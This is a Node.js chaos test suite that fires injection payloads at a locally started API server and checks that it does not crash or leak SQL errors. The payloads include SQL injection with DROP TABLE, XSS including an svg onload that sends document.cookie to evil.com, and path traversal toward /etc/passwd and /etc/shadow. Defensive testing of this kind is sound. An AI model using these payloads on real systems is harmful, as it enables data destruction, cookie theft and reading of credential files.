#!/usr/bin/env node
import { execSync } from "node:child_process";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const projectRoot = join(__dirname, "..", "..", "..", "..");
const qaDir = join(projectRoot, "scripts", "qa");

const failures = [];
let passed = 0;
let failed = 0;
const startTime = Date.now();

/**
 * @param {string} name Test name
 * @param {() => Promise<void>} fn Test body
 */
async function test(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (error) {
    failed++;
    console.log(`  ✗ ${name}: ${error.message}`);
    failures.push({ test: name, expected: "Passed", actual: error.message, detail: error.message });
  }
}

/**
 * Assert that a response does NOT contain a raw SQL error or return 500.
 * Accepts 200, 201, 400, 401, 403, 404 — anything but unhandled crash.
 */
async function assertNoCrash(res, label) {
  const text = await res.text();
  let body;
  try {
    body = JSON.parse(text);
  } catch {
    body = text;
  }

  const lower = typeof body === "string" ? body.toLowerCase() : JSON.stringify(body).toLowerCase();

  if (res.status === 500 && (
    lower.includes("sqlite") ||
    lower.includes("syntax error") ||
    lower.includes("prisma") ||
    lower.includes("stack trace") ||
    lower.includes("sql_error")
  )) {
    throw new Error(`${label}: leaked raw error (status=${res.status}): ${text.slice(0, 200)}`);
  }

  if (res.status >= 500) {
    throw new Error(`${label}: unexpected 5xx (status=${res.status}): ${text.slice(0, 200)}`);
  }
}

async function runChaosSuite() {
  try {
    // Step 1: Seed DB
    console.log("[1/5] Seeding database...");
    execSync("node lib/seed-db.mjs", { cwd: qaDir, stdio: "inherit" });

    // Step 2: Start server
    console.log("[2/5] Starting server...");
    const { startServer, stopServer } = await import("../../lib/server.mjs");
    const ctx = await startServer({});
    const base = `http://localhost:${ctx.port}`;

    // Step 3: Login as admin (needed for protected routes)
    console.log("[3/5] Obtaining admin token...");
    const loginRes = await fetch(`${base}/api/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "admin@tatachio.com", password: "admin123" }),
    });
    const loginData = await loginRes.json();
    if (!loginData.token) throw new Error("Login failed: no admin token");
    const token = loginData.token;
    const authHeaders = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };

    console.log("[4/5] Running chaos injection tests...\n");

    // ── SQL Injection in query params ──────────────────────────────────────

    console.log("SQL Injection — query params");

    await test("SQL injection in search param", async () => {
      const res = await fetch(
        `${base}/api/miembros?search=${encodeURIComponent("' OR 1=1--")}`,
        { headers: authHeaders },
      );
      await assertNoCrash(res, "SQL injection search");
    });

    await test("SQL injection via union select in search", async () => {
      const res = await fetch(
        `${base}/api/miembros?search=${encodeURIComponent("' UNION SELECT * FROM Usuario;--")}`,
        { headers: authHeaders },
      );
      await assertNoCrash(res, "UNION injection search");
    });

    await test("SQL injection with semicolon in cabildos search", async () => {
      const res = await fetch(
        `${base}/api/cabildos?search=${encodeURIComponent("; DROP TABLE Cabildo;--")}`,
        { headers: authHeaders },
      );
      await assertNoCrash(res, "SQL injection cabildos search");
    });

    await test("SQL injection sleep/timeout attempt", async () => {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      try {
        const res = await fetch(
          `${base}/api/miembros?search=${encodeURIComponent("'; SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END;--")}`,
          { headers: authHeaders, signal: controller.signal },
        );
        await assertNoCrash(res, "Time-based SQL injection");
      } catch (e) {
        if (e.name === "AbortError") throw new Error("Time-based injection caused timeout (possible sleep)");
        throw e;
      } finally {
        clearTimeout(timeout);
      }
    });

    // ── SQL Injection in body fields ───────────────────────────────────────

    console.log("\nSQL Injection — body fields");

    const validMember = {
      tipoIdentificacion: "CC",
      numeroDocumento: "99999999",
      nombres: "INJECTION-TEST",
      apellidos: "CHAOS",
      fechaNacimiento: "01/01/2000",
      parentesco: "CO",
      sexo: "F",
      integrantes: 1,
      familiaId: "cd8031c4-d2f7-423c-b5a8-1e98b793690a",
      cabildoId: "5dee2149-4442-486a-9ec5-3c20479d8261",
    };

    await test("SQL injection in nombres field (DROP TABLE)", async () => {
      const body = { ...validMember, nombres: "'; DROP TABLE Miembro;--", numeroDocumento: "10000001" };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "SQL injection in body nombres");
    });

    await test("SQL injection in apellidos field", async () => {
      const body = { ...validMember, apellidos: "'; DROP TABLE Familia;--", numeroDocumento: "10000002" };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "SQL injection in body apellidos");
    });

    await test("SQL injection in numeroDocumento field", async () => {
      const body = { ...validMember, numeroDocumento: "999' OR '1'='1" };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "SQL injection in numeroDocumento");
    });

    await test("SQL injection with boolean-based payload in nombres", async () => {
      const body = { ...validMember, nombres: "test' AND 1=1--", numeroDocumento: "10000003" };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "Boolean SQL injection in nombres");
    });

    // ── XSS in body ────────────────────────────────────────────────────────

    console.log("\nXSS — body fields");

    await test("XSS script tag in nombres", async () => {
      const body = { ...validMember, nombres: "<script>alert(1)</script>", numeroDocumento: "10000004" };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "XSS script in nombres");
    });

    await test("XSS img onerror in apellidos", async () => {
      const body = { ...validMember, apellidos: "<img src=x onerror=alert(1)>", numeroDocumento: "10000005" };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "XSS img onerror in apellidos");
    });

    await test("XSS svg onload in direccion", async () => {
      const body = {
        ...validMember,
        direccion: '<svg onload="fetch(\'http://evil.com?c=\'+document.cookie)">',
        numeroDocumento: "10000006",
      };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "XSS svg onload in direccion");
    });

    // ── Path Traversal ─────────────────────────────────────────────────────

    console.log("\nPath Traversal");

    await test("path traversal in cabildos ID", async () => {
      const res = await fetch(`${base}/api/cabildos/../../../etc/passwd`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Path traversal cabildos");
    });

    await test("path traversal encoded in miembros ID", async () => {
      const res = await fetch(
        `${base}/api/miembros/${encodeURIComponent("../../../etc/shadow")}`,
        { headers: authHeaders },
      );
      await assertNoCrash(res, "Path traversal encoded miembros");
    });

    await test("path traversal with backslashes in familias ID", async () => {
      const res = await fetch(`${base}/api/familias/..\\..\\..\\windows\\system32`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Path traversal backslashes familias");
    });

    // ── Null Byte Injection ────────────────────────────────────────────────

    console.log("\nNull Byte Injection");

    await test("null byte in search query", async () => {
      const res = await fetch(`${base}/api/miembros?search=test%00admin`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Null byte in search");
    });

    await test("null byte in cabildos ID param", async () => {
      const res = await fetch(
        `${base}/api/cabildos/5dee2149-4442-486a-9ec5-3c20479d8261%00.js`,
        { headers: authHeaders },
      );
      await assertNoCrash(res, "Null byte in cabildos ID");
    });

    await test("multiple null bytes in search", async () => {
      const res = await fetch(`${base}/api/miembros?search=%00%00%00HAX%00%00`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Multiple null bytes in search");
    });

    // ── Unicode Overflow ───────────────────────────────────────────────────

    console.log("\nUnicode Overflow");

    await test("large unicode search (1000 emojis)", async () => {
      const payload = "\u{1F525}".repeat(1000);
      const res = await fetch(`${base}/api/miembros?search=${encodeURIComponent(payload)}`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Unicode overflow search");
    });

    await test("right-to-left override unicode in search", async () => {
      const payload = "test\u202E\u2066admin\u2069";
      const res = await fetch(`${base}/api/miembros?search=${encodeURIComponent(payload)}`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "RTL override unicode");
    });

    await test("zero-width characters in nombres", async () => {
      const body = {
        ...validMember,
        nombres: "ZERO\u200B\u200C\u200D\uFEFFWIDTH",
        numeroDocumento: "10000007",
      };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "Zero-width chars in nombres");
    });

    // ── Extremely Long Query String ────────────────────────────────────────

    console.log("\nExtremely Long Inputs");

    await test("10KB+ search query string", async () => {
      const payload = "A".repeat(10240);
      const res = await fetch(`${base}/api/miembros?search=${encodeURIComponent(payload)}`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "10KB search query");
    });

    await test("50KB search query string", async () => {
      const payload = "B".repeat(51200);
      const res = await fetch(`${base}/api/miembros?search=${encodeURIComponent(payload)}`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "50KB search query");
    });

    await test("long string in body nombres field (5KB)", async () => {
      const body = {
        ...validMember,
        nombres: "X".repeat(5000),
        numeroDocumento: "10000008",
      };
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(body),
      });
      await assertNoCrash(res, "5KB nombres field");
    });

    // ── Negative Page/Limit Values ─────────────────────────────────────────

    console.log("\nNegative Page/Limit");

    await test("negative page parameter", async () => {
      const res = await fetch(`${base}/api/miembros?page=-1`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Negative page");
    });

    await test("negative limit parameter", async () => {
      const res = await fetch(`${base}/api/miembros?limit=-10`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Negative limit");
    });

    await test("both negative page and limit", async () => {
      const res = await fetch(`${base}/api/miembros?page=-5&limit=-100`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Negative page+limit");
    });

    await test("zero page parameter", async () => {
      const res = await fetch(`${base}/api/miembros?page=0`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Zero page");
    });

    await test("page as non-numeric string", async () => {
      const res = await fetch(`${base}/api/miembros?page=abc&limit=xyz`, {
        headers: authHeaders,
      });
      await assertNoCrash(res, "Non-numeric page/limit");
    });

    // ── Malformed Body / Edge Cases ────────────────────────────────────────

    console.log("\nMalformed Body & Edge Cases");

    await test("empty JSON body in POST", async () => {
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: "{}",
      });
      await assertNoCrash(res, "Empty JSON body");
    });

    await test("malformed JSON body (truncated)", async () => {
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: '{"nombres": "test", "apellidos": "x"',
      });
      await assertNoCrash(res, "Truncated JSON body");
    });

    await test("array instead of object in body", async () => {
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: "[]",
      });
      await assertNoCrash(res, "Array body instead of object");
    });

    await test("extremely deep nested JSON in body", async () => {
      let deepPayload = '"end"';
      for (let i = 0; i < 100; i++) deepPayload = `{"x": ${deepPayload}}`;
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: authHeaders,
        body: deepPayload,
      });
      await assertNoCrash(res, "Deeply nested JSON body");
    });

    // ── Unauthenticated Bombing ────────────────────────────────────────────

    console.log("\nUnauthenticated Endpoints");

    const noAuthHeaders = { "Content-Type": "application/json" };

    await test("SQL injection without auth token", async () => {
      const res = await fetch(
        `${base}/api/miembros?search=${encodeURIComponent("' OR 1=1--")}`,
        { headers: noAuthHeaders },
      );
      if (res.status !== 401) {
        const text = await res.text();
        throw new Error(`Expected 401 for unauthenticated access, got ${res.status}: ${text.slice(0, 200)}`);
      }
    });

    await test("XSS POST without auth token", async () => {
      const res = await fetch(`${base}/api/miembros`, {
        method: "POST",
        headers: noAuthHeaders,
        body: JSON.stringify({ nombres: "<script>alert(1)</script>", apellidos: "X" }),
      });
      if (res.status !== 401) {
        const text = await res.text();
        throw new Error(`Expected 401 for unauthenticated POST, got ${res.status}: ${text.slice(0, 200)}`);
      }
    });

    // Step 5: Stop + Report
    console.log("\n[5/5] Generating report...");
    await stopServer(ctx);

    const duration = Date.now() - startTime;
    const total = passed + failed;

    const { createReporter, addSuite, writeReport } = await import("../../lib/reporter.mjs");
    const rep = createReporter();
    addSuite(rep, "chaos/injection", {
      total,
      passed,
      failed,
      skipped: 0,
      duration_ms: duration,
      failures,
    });
    const { json } = writeReport(rep, qaDir);

    console.log(`\nVerdict: ${json.verdict}`);
    console.log(`${passed}/${total} passed${failed > 0 ? `, ${failed} failed` : ""}`);
    process.exit(failed > 0 ? 1 : 0);

  } catch (error) {
    console.error("Chaos injection suite failed:", error.message);
    console.error("Stack:", error.stack);

    try {
      const { createReporter, addSuite, writeReport } = await import("../../lib/reporter.mjs");
      const rep = createReporter();
      addSuite(rep, "chaos/injection", {
        total: 1,
        passed: 0,
        failed: 1,
        skipped: 0,
        duration_ms: 0,
        failures: [
          { test: "runChaosSuite", expected: "Suite completed", actual: error.message, detail: error.message, blocker: true },
        ],
      });
      writeReport(rep, qaDir);
    } catch (reportError) {
      console.error("Failed to generate error report:", reportError.message);
    }

    process.exit(1);
  }
}

runChaosSuite();
